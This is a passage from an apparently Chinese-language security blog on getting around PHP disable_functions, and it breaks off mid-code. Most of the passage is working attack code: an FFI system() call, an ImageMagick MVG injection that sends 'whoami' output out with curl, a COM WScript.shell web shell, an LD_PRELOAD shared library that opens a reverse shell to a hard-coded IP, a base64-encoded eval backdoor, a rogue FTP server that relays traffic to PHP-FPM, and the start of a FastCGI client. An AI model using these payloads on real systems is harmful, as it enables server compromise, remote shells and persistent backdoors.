class="headerlink" title="FFI扩展"></a>FFI扩展</h4><p>php&gt;7.4，开启了FFI扩展ffi.enable&#x3D;true，我们可以通过FFI来调用C中的system进而达到执行命令的目的</p><p>传入ffi.php。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//ffi.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$ffi</span> = FFI::<span class="hljs-title function_ invoke__">cdef</span>(<span class="hljs-string">&quot;int system(const char *command);&quot;</span>);<br><span class="hljs-variable">$ffi</span>-&gt;<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;whoami &gt;/tmp/1&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/tmp/1&quot;</span>);<br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;/tmp/1&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="ImageMagick"><a href="#ImageMagick" class="headerlink" title="ImageMagick"></a>ImageMagick</h4><p>两种利用方式，第一种是执行外带</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Disable Functions: &quot;</span> . <span class="hljs-title function_ invoke__">ini_get</span>(<span class="hljs-string">&#x27;disable_functions&#x27;</span>) . <span class="hljs-string">&quot;n&quot;</span>;<br><br><span class="hljs-variable">$command</span> = PHP_SAPI == <span class="hljs-string">&#x27;cli&#x27;</span> ? <span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>] : <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$command</span> == <span class="hljs-string">&#x27;&#x27;</span>) &#123;<br>    <span class="hljs-variable">$command</span> = <span class="hljs-string">&#x27;curl xx.xx.xx.xx:9962/`whoami`&#x27;</span>;<br>&#125;<br><br><span class="hljs-variable">$exploit</span> = <span class="hljs-string">&lt;&lt;&lt;EOF</span><br><span class="hljs-string">push graphic-context</span><br><span class="hljs-string">viewbox 0 0 640 480</span><br><span class="hljs-string">fill &#x27;url(http://IP:PORT/image.jpg&quot;&#124;<span class="hljs-subst">$command</span>&quot;)&#x27;</span><br><span class="hljs-string">pop graphic-context</span><br><span class="hljs-string">EOF</span>;<br><br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;test.mvg&quot;</span>, <span class="hljs-variable">$exploit</span>);<br><span class="hljs-variable">$thumb</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Imagick</span>();<br><span class="hljs-variable">$thumb</span>-&gt;<span class="hljs-title function_ invoke__">readImage</span>(<span class="hljs-string">&#x27;test.mvg&#x27;</span>);<br><span class="hljs-variable">$thumb</span>-&gt;<span class="hljs-title function_ invoke__">writeImage</span>(<span class="hljs-string">&#x27;test.png&#x27;</span>);<br><span class="hljs-variable">$thumb</span>-&gt;<span class="hljs-title function_ invoke__">clear</span>();<br><span class="hljs-variable">$thumb</span>-&gt;<span class="hljs-title function_ invoke__">destroy</span>();<br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;test.mvg&quot;</span>);<br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;test.png&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>监听即可。</p><p>第二种本质上还是LD_PRELOAD，原因在于Imagick()和mail()一样会启用新进程。上传exploit.so(反弹shell)与test.mo，然后执行代码：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">backdoor</span><span class="hljs-operator">=</span>putenv(<span class="hljs-string">&quot;LD_PRELOAD=/tmp/79e3f0b59df431154c088db7e45ebe6b/exploit.so&quot;</span>)<span class="hljs-comment">;$mov = new Imagick(&quot;/tmp/79e3f0b59df431154c088db7e45ebe6b/test.mov&quot;);</span><br></code></pre></td></tr></table></figure><p>开启新进程的过程中就会加载恶意so。</p><h4 id="COM组件"><a href="#COM组件" class="headerlink" title="COM组件"></a>COM组件</h4><p>仅适用于windows，开启com.allow_dcom &#x3D; true，添加extension&#x3D;php_com_dotnet.dll。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//exp.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$command</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-variable">$wsh</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">COM</span>(<span class="hljs-string">&#x27;WScript.shell&#x27;</span>); <span class="hljs-comment">// 生成一个COM对象　Shell.Application也能</span><br><span class="hljs-variable">$exec</span> = <span class="hljs-variable">$wsh</span>-&gt;<span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;cmd /c&quot;</span>.<span class="hljs-variable">$command</span>); <span class="hljs-comment">//调用对象方法来执行命令</span><br><span class="hljs-variable">$stdout</span> = <span class="hljs-variable">$exec</span>-&gt;<span class="hljs-title function_ invoke__">StdOut</span>();<br><span class="hljs-variable">$stroutput</span> = <span class="hljs-variable">$stdout</span>-&gt;<span class="hljs-title function_ invoke__">ReadAll</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$stroutput</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="PHP-FPM"><a href="#PHP-FPM" class="headerlink" title="PHP-FPM"></a>PHP-FPM</h4><p>FPM有TCP模式与Unix Socket模式，这里利用TCP模式构造fastcgi协议与fpm通信， 开启PHP_ADMIN_VALUE来加载恶意so。</p><p>此利用方式主要需要解决的问题是</p><ul><li>so的上传，需要目录写权限。</li><li>如何把二进制攻击流量打入fpm，我们知道gopher协议是支持转发二进制流量的，通常我们可以使用gopher+fpm利用curl实现ssrf rce，但是gopher协议受curl支持，不受php支持，要在php转发二进制流量需要借助FTP PASV mode。<ul><li>若目标机器出网，则可以在vps上运行恶意ftp转发流量打fpm。(参考<strong>one pointer php</strong>)</li><li>若目标机器不出网，则只能在机器本地起恶意ftp。(参考<strong>make php great and great again</strong>)</li></ul></li></ul><h5 id="目标出网"><a href="#目标出网" class="headerlink" title="目标出网"></a>目标出网</h5><p>1.编写并上传恶意so</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">//恶意so</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br>__attribute__ ((__constructor__)) <span class="hljs-type">void</span> <span class="hljs-title function_">preload</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    system(<span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/101.33.203.2/4444 0&gt;&amp;1&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc evil.c -o evil.so --shared -fPIC<br></code></pre></td></tr></table></figure><p>写一个脚本ftp.php用于上传</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>@<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">&#x27;test&#x27;</span>);<br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&quot;test&quot;</span>);<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;open_basedir&quot;</span>,<span class="hljs-string">&quot;..&quot;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&quot;..&quot;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&quot;..&quot;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&quot;..&quot;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&quot;..&quot;</span>);<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;open_basedir&quot;</span>,<span class="hljs-string">&quot;/&quot;</span>);<br><span class="hljs-variable">$context</span> = <span class="hljs-title function_ invoke__">stream_context_create</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;ftp&#x27;</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;overwrite&#x27;</span> =&gt; <span class="hljs-literal">true</span>)));<br>@<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>],<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;payload&#x27;</span>],<span class="hljs-number">0</span>,<span class="hljs-variable">$context</span>));<br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;code&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>base64编码并写入ftp.php</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">backdoor=file_put_contents(<span class="hljs-string">&#x27;ftp.php&#x27;</span>,base64_decode(<span class="hljs-string">&#x27;PD9waHAKc2hvd19zb3VyY2UoX19GSUxFX18pOwpAbWtkaXIoJ3Rlc3QnKTsKY2hkaXIoInRlc3QiKTtpbmlfc2V0KCJvcGVuX2Jhc2VkaXIiLCIuLiIpO2NoZGlyKCIuLiIpO2NoZGlyKCIuLiIpO2NoZGlyKCIuLiIpO2NoZGlyKCIuLiIpO2luaV9zZXQoIm9wZW5fYmFzZWRpciIsIi8iKTsKJGNvbnRleHQgPSBzdHJlYW1fY29udGV4dF9jcmVhdGUoYXJyYXkoJ2Z0cCcgPT4gYXJyYXkoJ292ZXJ3cml0ZScgPT4gdHJ1ZSkpKTsKQHZhcl9kdW1wKGZpbGVfcHV0X2NvbnRlbnRzKCRfR0VUWyd1cmwnXSwkX1BPU1RbJ3BheWxvYWQnXSwwLCRjb250ZXh0KSk7CkBldmFsKCRfUkVRVUVTVFsnY29kZSddKTsKPz4=&#x27;</span>)); <br><br><span class="hljs-comment">#可以开个远程的ftp尝试一下</span><br><br>POST /ftp.php?url=ftp://aa:passwd@IP/test.txt HTTP/1.1<br>............<br>payload=hello<br><br><span class="hljs-comment">#vps出现test.txt则出网</span><br></code></pre></td></tr></table></figure><p>传恶意so</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br>c = quote(<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;evil.so&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>).read())<br><span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;payload.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>).write(c)<br><span class="hljs-comment"># POST /ftp.php?url=/var/www/html/evil.so</span><br><span class="hljs-comment"># body里放payload.txt</span><br></code></pre></td></tr></table></figure><p>2.vps运行evil_ftp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#evil_ftp.py</span><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] listening ...........&quot;</span>)<br>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) <br>s.bind((<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-number">9999</span>))<br>s.listen(<span class="hljs-number">1</span>)<br>conn, addr = s.accept()<br>conn.send(<span class="hljs-string">b&#x27;220 (vsFTPd 3.0.3)\r\n&#x27;</span>)<br><span class="hljs-built_in">print</span>(conn.recv(<span class="hljs-number">0xff</span>))<br>conn.send(<span class="hljs-string">b&#x27;331 Please specify the password.\r\n&#x27;</span>)<br><span class="hljs-built_in">print</span>(conn.recv(<span class="hljs-number">0xff</span>))<br>conn.send(<span class="hljs-string">b&#x27;230 Login successful.\r\n&#x27;</span>)<br><span class="hljs-built_in">print</span>(conn.recv(<span class="hljs-number">0xff</span>))<br>conn.send(<span class="hljs-string">b&#x27;200 Switching to Binary mode.\r\n&#x27;</span>)<br><span class="hljs-built_in">print</span>(conn.recv(<span class="hljs-number">0xff</span>))<br>conn.send(<span class="hljs-string">b&quot;550 Could not get file size.\r\n&quot;</span>)<br><span class="hljs-built_in">print</span>(conn.recv(<span class="hljs-number">0xff</span>))<br>conn.send(<span class="hljs-string">b&#x27;000 use PASV then\r\n&#x27;</span>)<br><span class="hljs-built_in">print</span>(conn.recv(<span class="hljs-number">0xff</span>))<br>conn.send(<span class="hljs-string">b&#x27;227 Entering Passive Mode (127,0,0,1,0,9001).\r\n&#x27;</span>)  <span class="hljs-comment">#转发流量至fpm运行的端口</span><br><span class="hljs-built_in">print</span>(conn.recv(<span class="hljs-number">0xff</span>))<br>conn.send(<span class="hljs-string">b&#x27;150 Ok to send data.\r\n&#x27;</span>)<br><span class="hljs-comment"># sending payload .....</span><br>conn.send(<span class="hljs-string">b&#x27;226 Transfer complete.\r\n&#x27;</span>)<br><span class="hljs-built_in">print</span>(conn.recv(<span class="hljs-number">0xff</span>))<br>conn.send(<span class="hljs-string">b&#x27;221 Goodbye.\r\n&#x27;</span>)<br>conn.close()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] completed ~~&quot;</span>)<br></code></pre></td></tr></table></figure><p>3.生成恶意fpm流量</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Note : Code is released under the GNU LGPL</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Please do not change the header of this file</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This library is free software; you can redistribute it and/or modify it under the terms of the GNU</span><br><span class="hljs-comment"> * Lesser General Public License as published by the Free Software Foundation; either version 2 of</span><br><span class="hljs-comment"> * the License, or (at your option) any later version.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;</span><br><span class="hljs-comment"> * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * See the GNU Lesser General Public License for more details.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Handles communication with a FastCGI application</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span>      Pierrick Charron &lt;pierrick<span class="hljs-doctag">@webstart</span>.fr&gt; </span><br><span class="hljs-comment"> * <span class="hljs-doctag">@version</span>     1.0</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FCGIClient</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">VERSION_1</span>            = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">BEGIN_REQUEST</span>        = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">ABORT_REQUEST</span>        = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">END_REQUEST</span>          = <span class="hljs-number">3</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">PARAMS</span>               = <span class="hljs-number">4</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">STDIN</span>                = <span class="hljs-number">5</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">STDOUT</span>               = <span class="hljs-number">6</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">STDERR</span>               = <span class="hljs-number">7</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">DATA</span>                 = <span class="hljs-number">8</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">GET_VALUES</span>           = <span class="hljs-number">9</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">GET_VALUES_RESULT</span>    = <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">UNKNOWN_TYPE</span>         = <span class="hljs-number">11</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">MAXTYPE</span>              = <span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">UNKNOWN_TYPE</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">RESPONDER</span>            = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">AUTHORIZER</span>           = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">FILTER</span>               = <span class="hljs-number">3</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">REQUEST_COMPLETE</span>     = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CANT_MPX_CONN</span>        = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">OVERLOADED</span>           = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">UNKNOWN_ROLE</span>         = <span class="hljs-number">3</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">MAX_CONNS</span>            = <span class="hljs-string">&#x27;MAX_CONNS&#x27;</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">MAX_REQS</span>             = <span class="hljs-string">&#x27;MAX_REQS&#x27;</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">MPXS_CONNS</span>           = <span class="hljs-string">&#x27;MPXS_CONNS&#x27;</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">HEADER_LEN</span>           = <span class="hljs-number">8</span>;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Socket</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@var</span> Resource</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_sock</span> = <span class="hljs-literal">null</span>;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Host</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@var</span> String</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_host</span> = <span class="hljs-literal">null</span>;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Port</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@var</span> Integer</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_port</span> = <span class="hljs-literal">null</span>;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Keep Alive</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@var</span> Boolean</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_keepAlive</span> = <span class="hljs-literal">false</span>;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Constructor</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> String $host Host of the FastCGI application</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> Integer $port Port of the FastCGI application</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$host</span>, <span class="hljs-variable">$port</span> = <span class="hljs-number">9000</span></span>) // <span class="hljs-title">and</span> <span class="hljs-title">default</span> <span class="hljs-title">value</span> <span class="hljs-title">for</span> <span class="hljs-title">port</span>, <span class="hljs-title">just</span> <span class="hljs-title">for</span> <span class="hljs-title">unixdomain</span> <span class="hljs-title">socket</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span 